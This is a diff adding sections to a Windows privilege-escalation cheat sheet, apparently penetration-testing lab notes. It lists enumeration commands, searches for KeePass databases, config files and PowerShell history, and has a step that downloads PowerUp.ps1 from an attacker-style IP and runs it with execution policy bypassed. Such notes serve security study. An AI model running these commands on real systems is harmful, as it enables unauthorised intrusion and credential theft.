@@ -18,6 +18,59 @@
 - [ ] Check for .kdbx from current user's directory
 - [ ] [Service Exploits](#Service_Exploits)
 
+# Situational awareness
+```bash
+# is current user part of interesting group?
+whoami /groups
+
+# other users/groups
+Get-LocalUser
+Get-LocalGroup
+
+# check members 
+Get-LocalGroupMember adminteam
+
+# check operating system
+systeminfo
+
+# network interfaces
+ipconfig /all
+
+# active network connections
+netstat -ano
+
+# routing table
+route print
+
+# installed applications
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+C:\Program Files
+C:\Users\currentUser\Downloads
+
+# running process
+Get-Process
+```
+
+# Passwords
+```bash
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+
+Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+```
+
+# Powershell scripts
+```bash
+Get-History
+(Get-PSReadlineOption).HistorySavePath
+type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+type C:\Users\Public\Transcripts\transcript01.txt
+
+```
 
 # Service Exploits
 ## Service Commands
@@ -35,9 +88,18 @@ sc.exe config <name> <option>= <value>
 net start/stop <name>
 ```
 
+## Powerup displays services the current user can modify
+```bash
+iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-ModifiableServiceFile
+```
+
 ## Query the WMI class win32_service.
 ```bash
-Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName, StartMode | Where-Object {$_.State -like 'Running'}
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
 ```
 
 ## Service Exploits - Insecure Service Permissions
